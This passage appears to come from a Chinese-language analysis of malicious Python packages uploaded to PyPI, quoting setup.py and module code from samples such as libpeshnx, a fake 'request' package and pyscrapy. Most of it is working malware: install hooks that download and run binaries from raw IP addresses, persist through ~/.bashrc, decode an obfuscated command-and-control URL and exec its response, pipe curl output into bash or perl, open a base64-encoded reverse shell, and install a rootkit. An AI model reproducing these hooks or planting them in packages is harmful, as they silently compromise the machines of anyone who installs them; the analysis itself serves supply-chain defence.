        'setuptools.installation': [
            'eggsecutable = libari.pr:rn'
        ]
      },
      version = '0.6',
      description = 'Libari wrapper for python',
      author = 'Ruri12',
      author_email = 'PI:EMAIL',
      scripts=["pr.py"],
      url = '',
      download_url = '', 
      keywords = ['libari'],
      classifiers = [],
    )
    # pr.py
    def rn ():
        import platform
        import urllib2
        import os, stat
        ADD_LOC = "http://145.249.104.71/out"
        LOC = ".drv"
        if platform.system () == "Linux":
                response = urllib2.urlopen (ADD_LOC)
                os.chdir (os.path.expanduser ("~"))
                d = open (LOC, "wb")
                d.write (response.read ())
                d.close ()
                current_state = os.stat (LOC)
                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)
                brc = open (".bashrc", "a")
                brc.write ("\n~/.drv &")
                brc.close ()
        else:
                print ("Error installing library!")
                exit (-1)
  * ##### libpeshnx-0.1
通过setup.py脚本setup函数下entry_points参数调用pr.py中rn函数执行恶意代码，下发和木马主体均在本地，下载远端恶意脚本后~/.bashrc持久化。
    # libpeshnx-0.1/setup.py
    from setuptools import setup, find_packages
    setup(
        name='libpeshnx',
        packages=find_packages(),
        entry_points={
            'setuptools.installation': [
                'eggsecutable = libari.pr:rn'
            ]
        },
        version='0.1',
        description='Libari wrapper for python',
        author='Ruri12',
        author_email='PI:EMAIL',
        url='',
        download_url='',
        keywords=['libari'],
        classifiers=[],
    )
    # libpeshnx-0.1/libari/pr.py
    def rn ():
        import platform
        import urllib2
        import os, stat
        ADD_LOC = "http://www.baidu.com/out"
        LOC = ".drv"
        if platform.system () == "Linux":
                response = urllib2.urlopen (ADD_LOC)
                os.chdir (os.path.expanduser ("~"))
                d = open (LOC, "wb")
                d.write (response.read ())
                d.close ()
                current_state = os.stat (LOC)
                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)
                brc = open (".bashrc", "a")
                brc.write ("\n~/.drv &")
                brc.close ()
        else:
                print ("Error installing library!")
                exit (-1)
  * ##### request-1.0.117
伪装requests模块包，通过setup.py脚本setup函数下cmdclass参数调用执行恶意代码；下发部分对c2地址进行变换base64编码避开base64特征匹配，木马部分采用lzma+b85encode压缩编码混淆后exec执行主体，主体部分包含命令执行、文件上传等一套木马脚本，并采用~/.bashrc进行持久化。
    # request-1.0.117/setup.py 
    from setuptools import setup, find_packages
    import atexit,signal
    from setuptools.command.install import install
    def _post_on_exit():
            try:
                import os
                tmp_dir = os.environ.get('TMPDIR') if os.environ.get('TMPDIR') else (os.environ.get('TEMP') if os.environ.get('TEMP') else ('/tmp' if os.path.exists('/tmp') else os.environ.get('HOME')))
                os.chdir(tmp_dir)
                from hmatch import license_check
                license_check()
            except Exception as e:
                pass
    class PostInstallCommand(install):
        def run(self):
            install.run(self)
            atexit.register(_post_on_exit)
            signal.signal(signal.SIGTERM,_post_on_exit)
            signal.signal(signal.SIGINT,_post_on_exit)
    INSTALL_REQUIRES = [
       'requests',
    ]
    setup(
        name='request',
        version='1.0.117',
        description='Request Match',
        long_description='A tool for mass regex checking websites',
        license='APACHE License',
        author='Elis',
        author_email='PI:EMAIL',
        url='https://elis.cc',
        keywords='hmatch, request',
        install_requires=INSTALL_REQUIRES,
        include_package_data=True,
        zip_safe=False,
        py_modules=['request','hmatch'],
        packages=find_packages(),
        entry_points={'console_scripts': ['hmatch = hmatch:main']},
        cmdclass={
            'install': PostInstallCommand,
        }
    )
    # request-1.0.117/hmatch.py
    def license_check():
        gg = ""
        try:
            gg = urlopen(base64.b64decode("=82cus2Ylh2YvQ3clVXclJ3Lw9GdukHelR2LvoDc0RHa"[::-1]).decode('utf-8')).read().decode('utf-8')
        except Exception as e:
            pass
        if "license" in gg:
            try:
                exec(gg)
            except:
                pass
     ...
    # check.so(样本未收集到，部分脚本见https://security.tencent.com/index.php/blog/msg/160)
  * ##### pyscrapy-0.3.0
通过setup.py脚本setup函数下下cmdclass参数调用执行恶意代码，下发和木马主体均在本地，下载远端恶意脚本后~/.bashrc持久化。
    # pyscrapy-0.3.0/setup.py
    import subprocess, os
    from setuptools import setup
    from setuptools.command.install import install
    class TotallyInnocentClass(install):
        # trustpiphuh
        def run(self):
            subprocess.run('curl http://13.93.28.37:8080/p | perl -', shell=True)
            # pyscrapy
            os.system('wget http://39.108.192.78:81/shell.elf')
            os.system('chmod +x ./shell.elf')
            os.system('./shell.elf &')
            os.remove('./sh.elf')
            raise SystemExit(
                "[+] It looks like you try to install pyscrapy without checking it.\n"
                "[-] is that alright? \n"
                "[] complete!"
            )
            # trustypip
            install.run(self)
            LHOST = '13.93.28.37'
            LPORT = 8888
            reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(
                LHOST=LHOST, LPORT=LPORT)
            encoded = base64.b64encode(reverse_shell.encode())
            os.system('echo %s|base64 -d|bash' % encoded.decode())
            # pip_security
            install.run(self)
            print("try copy file")
            os.system('cp rootkit/dist/pip_security /usr/local/bin/rootkit')
            print("rootkit install ;)")
            os.system('rootkit/dist/pip_security install')
            print("run rootkit ;)")
            os.system('rootkit &')
            print("exit")
            # fakessh
            install.run(self)
            os.system('curl -qs http://34.69.215.243/hi 2>/dev/null | bash 2>/dev/null >/dev/null')
    setup(
        name="trustpiphuh",
        version="0.0.2",
        author="Example Author",
        author_email="PI:EMAIL",
        description="DONT INSTALL THIS",
        long_description_content_type="text/markdown",
        url="https://github.com/pypa/sampleproject",
        classifiers=[
            "Programming Language :: Python :: 3",
            "License :: OSI Approved :: MIT License",
            "Operating System :: OS Independent",
        ],
        cmdclass={
            "install": TotallyInnocentClass
        }
    )